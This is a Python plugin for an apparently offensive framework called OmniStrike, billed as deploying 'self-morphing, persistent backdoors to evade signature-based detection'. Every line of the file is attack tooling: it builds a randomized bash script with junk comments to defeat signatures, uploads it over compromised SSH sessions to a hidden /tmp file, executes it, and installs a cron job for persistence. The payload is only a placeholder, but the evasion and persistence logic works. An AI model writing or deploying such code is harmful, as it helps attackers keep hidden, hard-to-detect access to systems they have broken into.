import asyncio
import asyncssh
import random
import string
from omnistrike.plugins.base import BasePlugin

class MorphingBackdoorPlugin(BasePlugin):
    @property
    def name(self):
        return "MorphingBackdoor"

    @property
    def description(self):
        return "Deploys self-morphing, persistent backdoors to evade signature-based detection."

    def _generate_polymorphic_script(self):
        # Generates a randomized bash script that does the same thing
        var_name = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        junk_comment = ''.join(random.choice(string.ascii_letters) for _ in range(20))

        script = f"""#!/bin/bash
# {junk_comment}
{var_name}="Sovereign Control Active"
echo ${var_name}
# Randomized sleep to evade behavioral detection
sleep {random.randint(1, 5)}
# Persistence logic (example: append to bashrc)
grep -q "OmniStrike" ~/.bashrc || echo "# OmniStrike Apex System Service" >> ~/.bashrc
"""
        return script

    async def run(self, target, data):
        sessions = self.session_manager.list_sessions()
        if not sessions:
            return

        print(f"[*] Deploying Morphing Backdoors to {len(sessions)} session(s)...")
        deployment_results = {}

        for session in sessions:
            print(f"[*] Morphing and deploying to Session {session.id}...")
            try:
                script_content = self._generate_polymorphic_script()
                remote_path = f"/tmp/.sys_service_{random.randint(1000, 9999)}"

                # Upload and execute
                async with session.conn.start_sftp_client() as sftp:
                    async with sftp.open(remote_path, 'w') as f:
                        await f.write(script_content)

                await session.conn.run(f"chmod +x {remote_path} && {remote_path}")
                print(f"    [!!!] Backdoor deployed and executed: {remote_path}")
                deployment_results[session.id] = remote_path

                # We can also add a cronjob for persistence
                cron_cmd = f'(crontab -l 2>/dev/null; echo "*/30 * * * * {remote_path}") | crontab -'
                await session.conn.run(cron_cmd)

            except Exception as e:
                print(f"[!] Deployment failed for Session {session.id}: {e}")

        data['backdoor_deployments'] = deployment_results
